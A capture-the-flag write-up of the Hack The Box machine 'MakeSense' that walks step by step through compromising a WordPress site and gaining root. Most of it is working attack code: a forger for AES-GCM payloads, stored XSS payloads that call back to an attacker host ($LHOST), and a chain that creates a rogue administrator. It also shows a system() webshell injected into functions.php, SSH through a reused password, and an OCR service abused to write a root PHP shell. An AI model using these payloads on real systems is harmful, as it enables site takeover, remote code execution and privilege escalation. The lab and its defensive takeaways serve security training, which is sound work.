---
title: "HTB - MakeSense"
date: 2026-07-04
tags: ["HackTheBox", "Linux", "Medium", "WordPress", "XSS"]
categories: ["Machines&Challenges"]
difficulty: "Medium"
os: "Linux"
author: "z3r0s"
featuredImage: "/logos/Makesense.png"
---
**Hack The Box · Season Machine**

| Detail     | Value                      |
|------------|----------------------------|
| Difficulty | Medium                     |
| OS         | Linux (Ubuntu 24.04)       |
| IP         | 10.x.x.x                  |
| Author     | zeros                      |

A WordPress site with a browser-based voice transcription feature leaks its encryption key client-side. A chained stored XSS creates an admin account, theme-editor injection gives a shell, and an internal OCR service running as root writes attacker-controlled text to a PHP file.

---

## Attack Chain

```
┌─────────────┐    ┌───────────────┐    ┌──────────────┐    ┌──────────────┐    ┌──────────────┐
│  Stored XSS │───▶│ Admin Account │───▶│ Theme Editor │───▶│ SSH as walter│───▶│ Root via OCR │
│             │    │               │    │              │    │              │    │              │
│ Encrypted   │    │ XSS creates   │    │ PHP webshell │    │ Password     │    │ Arbitrary    │
│ payload via │    │ WP admin user │    │ in           │    │ reuse from   │    │ file write   │
│ leaked AES  │    │               │    │ functions.php│    │ wp-config    │    │ as root      │
│ key         │    │               │    │              │    │              │    │              │
└─────────────┘    └───────────────┘    └──────────────┘    └──────────────┘    └──────────────┘
```

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [Enumeration](#enumeration)
3. [Foothold - Stored XSS](#foothold---stored-xss)
4. [WordPress Admin Takeover](#wordpress-admin-takeover)
5. [RCE as www-data](#rce-as-www-data)
6. [Lateral Movement - User](#lateral-movement---user)
7. [Privilege Escalation - Root](#privilege-escalation---root)
8. [Key Takeaways](#key-takeaways)

---

## Reconnaissance

A full TCP port scan reveals four ports, but only two are reachable from outside the network.

```bash
$ nmap -Pn -n -T4 --min-rate 3000 -p- $TARGET

PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   filtered http
443/tcp  open     https
8001/tcp filtered vcom-tunnel
```

A targeted service scan on the open ports identifies the technology stack.

```bash
$ nmap -Pn -sVC -p22,443 $TARGET

22/tcp  open  ssh       OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
443/tcp open  ssl/http  Apache/2.4.58 (Ubuntu)
|_http-generator: WordPress 7.0
| ssl-cert: Subject: commonName=makesense.htb
|_http-title: Agency LLC
```

After adding `makesense.htb` to `/etc/hosts`, the WordPress site loads: a corporate "Agency LLC" page running a custom theme called **webagency**. Port 80 is filtered (internal redirect), and 8001 turns out later to be bound to localhost only.

---

## Enumeration

### WordPress Users

The REST API endpoint at `/?rest_route=/wp/v2/users` discloses three accounts.

| User   | Slug    | Role          |
|--------|---------|---------------|
| admin  | admin   | Administrator |
| walter | walter  | Administrator |
| jake   | jake    | Contributor   |

### The Voice Feature

Inspecting the page source reveals an unusual set of assets for a corporate agency site: a "call / voice message" widget that performs browser-based speech transcription using the **Whisper** AI model (loaded as ONNX files) and text summarization with **DistilBART**, all powered by `transformers.js`.

```
wp-content/themes/webagency/assets/js/main.js
wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js
wp-content/ai-models/transformers/transformers.js
wp-content/ai-models/models/whisper-tiny.en/onnx/...
wp-content/ai-models/models/distilbart-cnn-12-6/onnx/...
```

### Hardcoded Encryption Key

Reading `whisper-wrapper.js` reveals a hardcoded AES-GCM symmetric encryption key at line 7. This key is shared between client and server - the client encrypts the transcription and summary payload before submission, and the server decrypts it on receipt.

```javascript
// Symmetric encryption key (must match server-side)
const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';
```

> **Key insight:** Client-side "encryption" is not a security boundary when the key ships in a JavaScript bundle. Anyone can encrypt arbitrary payloads without ever touching the audio or ML pipeline.

### Symbol Mapping - The XSS Enabler

The same file contains an `applySymbolMapping()` function that converts spoken words into HTML-significant characters. This is the feature that makes the voice transcription path XSS-capable by design.

```javascript
const mappings = {
    'open bracket':     '<',
    'close bracket':    '>',
    'slash':            '/',
    'quote':            "'",
    'double quote':     '"',
    'equal':            '=',
    // ... 20+ more mappings
};
```

### AJAX Submission Flow

Reading `main.js` reveals the full data flow. The AJAX URL, nonce, and endpoint names are exposed in the page source via a `webagency_ajax` object.

1. `submit_contact_form` - creates a WordPress post from name/email/phone/message fields. Returns a `post_id`.
2. `save_voice_raw` - uploads the raw WAV recording.
3. `save_voice_results` - accepts the `post_id` plus an AES-GCM encrypted JSON payload containing `{transcription, summary}`. The server decrypts it and stores both fields in the post for admin review.

An internal automation process (a headless Chrome bot running as the `admin` system user) periodically visits `/wp-admin/edit.php?post_type=contact_submission` to review these submissions - rendering any HTML in the stored transcription field.

---

## Foothold - Stored XSS

The attack bypasses the entire audio/ML pipeline. Since the encryption key is known, we can encrypt any arbitrary JSON payload and submit it directly through the AJAX endpoint. The server will decrypt it and store the raw HTML content.

### Step 1 - Obtain a Post ID

A standard contact form submission creates a post and returns its ID.

```python
s = requests.Session()
s.verify = False

# Extract nonce from page source
r = s.get('https://makesense.htb')
nonce = re.search(r'"nonce":"([^"]+)"', r.text).group(1)

r = s.post(ajax_url, data={
    'action': 'submit_contact_form',
    'nonce': nonce,
    'name': 'John Doe',
    'email': 'john@example.com',
    'phone': '555-0123',
    'message': 'Interested in your services.'
})
post_id = r.json()['data']['post_id']
```

### Step 2 - Encrypt XSS Payload

The encryption matches the JavaScript `encryptPayload()` function exactly: SHA-256 the key string to derive a 256-bit AES key, generate a random 12-byte IV, encrypt with AES-GCM (which appends a 16-byte auth tag), then concatenate IV + ciphertext + tag and base64-encode.

```python
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI'

def encrypt_payload(payload_dict):
    plaintext = json.dumps(payload_dict).encode()
    key = hashlib.sha256(ENCRYPTION_KEY.encode()).digest()
    iv = os.urandom(12)
    ct = AESGCM(key).encrypt(iv, plaintext, None)
    return base64.b64encode(iv + ct).decode()
```

### Step 3 - Plant the Payload

A simple beacon payload confirms execution. The `img onerror` handler fires immediately when the admin bot renders the stored HTML - unlike `<script>` tags, which don't execute when injected via `innerHTML`.

```python
xss = '<img src=x onerror="fetch(\'http://$LHOST:9001/ping\')">'

payload = {"transcription": xss, "summary": "test"}
encrypted = encrypt_payload(payload)

r = s.post(ajax_url, data={
    'action': 'save_voice_results',
    'nonce': nonce,
    'post_id': str(post_id),
    'encrypted_payload': encrypted
})
```

Within about 60 seconds, a callback arrives on the listener - confirming the stored XSS executes in the admin's browser session.

```
[+] GOT REQUEST: /ping
[+] GOT REQUEST: /steal?c=wp-settings-time-3=1783192349
```

> **HttpOnly cookies:** The WordPress session cookies (`wordpress_sec_*`, `wordpress_logged_in_*`) are all HttpOnly - they cannot be read via `document.cookie`. Only the non-sensitive `wp-settings-time` cookie is accessible. This means cookie theft won't work; we need a different approach.

---

## WordPress Admin Takeover

Since cookies are HttpOnly, the XSS payload instead makes authenticated requests directly from within the admin's browser session - the cookies are automatically attached to same-origin `fetch()` calls even though JavaScript can't read them.

### Creating an Administrator Account via XSS

The payload is a two-step chain: first, fetch the `/wp-admin/user-new.php` page to extract the CSRF nonce (`_wpnonce_create-user`), then POST a form to create a new administrator.

```html
<img src=x onerror="
  fetch('/wp-admin/user-new.php',{credentials:'include'})
  .then(r=>r.text())
  .then(h=>{
    var d=new DOMParser().parseFromString(h,'text/html');
    var n=d.querySelector('[name=_wpnonce_create-user]').value;
    var fd=new FormData();
    fd.append('action','createuser');
    fd.append('_wpnonce_create-user',n);
    fd.append('user_login','hacker');
    fd.append('email','hacker@evil.com');
    fd.append('pass1','H4ck3r!Pass99');
    fd.append('pass2','H4ck3r!Pass99');
    fd.append('pw_weak','on');
    fd.append('role','administrator');
    fd.append('createuser','Add New User');
    return fetch('/wp-admin/user-new.php',
      {method:'POST',credentials:'include',body:fd});
  })
  .then(r=>fetch('http://$LHOST:9001/done?ok=true'))
">
```

The callback confirms the account was created.

```
GET /gotnonce?n=3a1f43db93
GET /done?ok=true&len=58049
```

Logging in as `hacker:H4ck3r!Pass99` confirms full administrator access to the WordPress dashboard.

---

## RCE as www-data

WordPress's built-in **Theme Editor** (Appearance → Theme File Editor) allows administrators to directly edit PHP files that the web server executes on every page load. No plugin upload is needed.

### Injecting a Webshell

Navigate to the active theme's `functions.php`, extract the form nonce (the field is named `nonce`, not the usual `_wpnonce`), and append a one-line command execution snippet.

```python
# Login and get editor page
r = s.get('https://makesense.htb/wp-admin/theme-editor.php'
          '?file=functions.php&theme=webagency')

# Extract the nonce and current file content
nonce = re.search(r'name="nonce" value="([^"]+)"', r.text).group(1)
content = html.unescape(
    re.search(r'id="newcontent"[^>]*>(.*?)</textarea>',
              r.text, re.DOTALL).group(1))

# Inject webshell after opening <?php tag
shell = 'if(isset($_REQUEST["cmd"])){system($_REQUEST["cmd"]);die();}'
modified = content.replace('<?php', '<?php\n' + shell + '\n', 1)

# Submit
r = s.post('https://makesense.htb/wp-admin/theme-editor.php', data={
    'nonce': nonce,
    'newcontent': modified,
    'action': 'update',
    'file': 'functions.php',
    'theme': 'webagency',
    'submit': 'Update File'
})
# "File edited successfully"
```

```bash
$ curl -sk "https://makesense.htb/?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Lateral Movement - User

### Credential Discovery

The WordPress configuration file uses SQLite rather than MySQL, but the dummy MySQL credentials are still populated - and the password is reused.

```php
define( 'DB_DIR', __DIR__ . '/wp-content/database/' );
define( 'DB_FILE', '.ht.sqlite' );

// Dummy MySQL settings (required but not used with SQLite)
define( 'DB_USER',     'walter' );
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
```

### SSH as walter

The database password `JbhHDAEgXvri3!` is reused as walter's SSH password.

```bash
$ sshpass -p 'JbhHDAEgXvri3!' ssh walter@$TARGET

walter@makesense:~$ cat ~/user.txt
```

> **user.txt:** `********************************`

### Internal Service Discovery

Listing local listening ports and processes reveals the filtered port 8001 from the initial scan.

```bash
walter@makesense:~$ ss -tlnp
LISTEN  127.0.0.1:8001   # internal only

walter@makesense:~$ ps aux | grep 8001
root  1389  php -S 127.0.0.1:8001 -t /root/ocr4/
```

> **The target:** A PHP built-in web server, running as **root**, serving files from `/root/ocr4/`, and only listening on localhost. This is the OCR service referenced in the box name and badge art - "MakeSense" of images.

The service is protected by HTTP Basic Auth. The same password from `wp-config.php`, reused with the username `walter`, grants access.

```bash
walter@makesense:~$ curl -s -u walter:JbhHDAEgXvri3! http://127.0.0.1:8001/
<!-- MakeSense OCR application -->
<h1>Draw text. Read it back.</h1>
<p>Sketch a word or short phrase... ready to save to a file.</p>
```

---

## Privilege Escalation - Root

The internal OCR application is a drawing-based text recognition tool. It presents a canvas where a user draws text, submits it for Tesseract OCR processing, and can then **save the recognized text to a file** with a user-chosen filename.

The critical combination: the server runs as **root**, the recognized text is **attacker-controlled** (via the submitted image), the filename is **attacker-chosen**, and saved files land inside the web-served directory. This is an arbitrary file write that becomes code execution.

### Step 1 - Craft a Clean PHP Shell Image

Generate an image containing a PHP webshell in a clean monospace font so Tesseract reads it accurately.

```bash
$ convert -size 600x60 xc:white -font Courier -pointsize 36 \
    -fill black -annotate +10+40 '<?php system($_GET["c"]);?>' shell.png
```

### Step 2 - Submit to OCR

Upload the image as a base64 data URI via the `canvas_image` form field, maintaining cookies across requests so the OCR result is associated with our session.

```bash
walter@makesense:~$ IMG_B64=$(base64 -w0 /tmp/shell.png)
walter@makesense:~$ curl -s -u walter:JbhHDAEgXvri3! \
  -c /tmp/cookies.txt \
  http://127.0.0.1:8001/ \
  --data-urlencode "canvas_image=data:image/png;base64,${IMG_B64}" \
  | grep -oP 'ocr_id" value="\K[^"]+'

ocr_6a495f5c5196a9.33856139
```

The OCR recognizes the text correctly: `<?php system($_GET["c"]) ;?>`

### Step 3 - Save as PHP

Submit the save form with the same session cookies, a `.php` filename, and the `ocr_id` referencing the recognition result. Files are written to a `saved/` subdirectory inside the OCR app's document root.

```bash
walter@makesense:~$ curl -s -u walter:JbhHDAEgXvri3! \
  -b /tmp/cookies.txt \
  http://127.0.0.1:8001/ \
  -d "ocr_id=ocr_6a495f5c5196a9.33856139&filename=cmd.php&save_output=Save" \
  | grep notice

<p class="notice success">Saved as: saved/cmd.php</p>
```

### Step 4 - Execute as Root

The PHP built-in server executes the saved file with root privileges.

```bash
walter@makesense:~$ curl -s -u walter:JbhHDAEgXvri3! \
  "http://127.0.0.1:8001/saved/cmd.php?c=id"

uid=0(root) gid=0(root) groups=0(root)

walter@makesense:~$ curl -s -u walter:JbhHDAEgXvri3! \
  "http://127.0.0.1:8001/saved/cmd.php?c=cat+/root/root.txt"
```

> **root.txt:** `********************************`

---

## Collected Credentials

| Context                    | Username | Password / Key                           |
|----------------------------|----------|------------------------------------------|
| AES-GCM encryption key     | -        | `bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI`  |
| WordPress admin (created)  | hacker   | `H4ck3r!Pass99`                          |
| wp-config.php DB_PASSWORD  | walter   | `JbhHDAEgXvri3!`                         |
| SSH                        | walter   | `JbhHDAEgXvri3!`                         |
| OCR service (HTTP Basic)   | walter   | `JbhHDAEgXvri3!`                         |

---

## Key Takeaways

1. **Client-side encryption is obfuscation, not security.** If the key ships in a JavaScript bundle that anyone can read, the "encryption" protects nothing. Sensitive payloads need server-side validation and sanitization regardless of transport encryption.

2. **A function that converts words into angle brackets is a red flag.** The `applySymbolMapping()` function turns dictated speech into HTML-significant characters by design. Whether intentional or an oversight, it makes any path that stores the output XSS-capable.

3. **Blind XSS doesn't require cookie theft.** When cookies are HttpOnly, making authenticated `fetch()` calls from within the victim's session - where cookies are attached automatically - is more reliable than trying to exfiltrate them. The XSS payload can perform any admin action the victim's session allows.

4. **WordPress Theme/Plugin Editors are instant code execution.** Once admin access is gained, there's no need to upload a malicious plugin or find a secondary vulnerability. The built-in file editor writes directly to PHP files that the server executes.

5. **Database passwords travel.** The password in `wp-config.php` wasn't even used for a real database connection (the site runs SQLite), but it was reused for SSH and for the internal OCR service's HTTP Basic auth. Credential reuse bridged a low-privilege web shell to user-level SSH access.

6. **Image-to-text-to-file is arbitrary file write.** Any service that recognizes text from an image and lets you choose where to save the output is effectively an arbitrary file write primitive. When that service also serves the directory where files are written, and runs as root, the write becomes root-level code execution.

---

*MakeSense · Hack The Box Seasonal Machine · Medium · Linux*
